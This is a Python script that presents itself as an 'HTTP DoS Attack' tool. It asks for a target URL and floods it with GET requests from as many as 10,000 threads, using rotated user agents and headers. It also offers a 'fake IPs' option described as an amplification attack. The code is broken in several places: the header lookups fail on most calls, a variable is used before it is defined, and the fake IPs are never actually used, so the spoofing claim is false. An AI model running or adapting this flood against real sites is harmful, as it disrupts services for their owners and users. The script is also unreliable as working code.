import socket
import random
import threading
import pyfiglet
from colorama import init, Fore, Style
import requests
import time

# Initialize colorama
init()

# List of fake IP addresses for amplification attack
fake_ips = [
    "192.19.12.1",
    "182.19.41.2",
    "196.15.91.4",
    "191.190.1.3",
    "193.161.5.1",
    # Add more fake IPs here if needed
]

# List of additional headers for the attack
additional_headers = [
    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Accept-Language": "en-US,en;q=0.5"},
    {"Connection": "keep-alive"},
    {"Upgrade-Insecure-Requests": "1"},
    # Add more headers here if needed
]

# List of common user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    # Add more user agents here if needed
]

# List of additional POST data for the attack
additional_post_data = [
    "username=admin&password=password123",  # Example POST data
    # Add more POST data here if needed
]

# Function to check if target is reachable
def check_target(target_url):
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Target {target_url} is reachable.{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Target {target_url} responded with status code {response.status_code}. It might be protected.{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error checking target {target_url}: {e}{Style.RESET_ALL}")
        return False

# Function for HTTP GET DoS attack
def http_get_dos(target_url, num_requests):
    try:
        parsed_url = requests.utils.urlparse(target_url)
        target_host = parsed_url.netloc
        
        # Prepare headers for HTTP request
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": random.choice(additional_headers)["Accept"],
            "Accept-Encoding": random.choice(additional_headers)["Accept-Encoding"],
            "Accept-Language": random.choice(additional_headers)["Accept-Language"],
            "Connection": random.choice(additional_headers)["Connection"],
            "Upgrade-Insecure-Requests": random.choice(additional_headers)["Upgrade-Insecure-Requests"],
        }
        
        # Perform HTTP GET requests
        for _ in range(num_requests):
            response = requests.get(target_url, headers=headers)
            print(f"{Fore.GREEN}[+] Sent GET request to {target_url}{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

# Function for launching DoS attack with multiple threads and fake IPs
def launch_dos_attack(target_url, num_threads, num_requests_per_thread, use_fake_ips=False):
    threads = []
    for i in range(num_threads):
        if use_fake_ips:
            ip = random.choice(fake_ips)
        else:
            ip = socket.gethostbyname(parsed_url.netloc)
        
        thread = threading.Thread(target=http_get_dos, args=(target_url, num_requests_per_thread))
        thread.start()
        threads.append(thread)
        time.sleep(0.01)  # Small delay to spread out thread starts
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ascii_banner = pyfiglet.figlet_format("HTTP DoS Attack")
    print(f"{Fore.RED}{ascii_banner}{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}Welcome to HTTP DoS Attack Script{Style.RESET_ALL}")

    target_url = input(f"{Fore.CYAN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
    num_threads = 10000  # Number of threads to use for the attack
    num_requests_per_thread = int(input(f"{Fore.CYAN}Enter number of requests per thread: {Style.RESET_ALL}"))
    use_fake_ips = input(f"{Fore.CYAN}Use fake IPs for attack? (y/n): {Style.RESET_ALL}").lower() == 'y'

    print(f"{Fore.YELLOW}Launching DoS attack on {target_url} with {num_threads} threads and {num_requests_per_thread} requests per thread...{Style.RESET_ALL}")
    launch_dos_attack(target_url, num_threads, num_requests_per_thread, use_fake_ips)
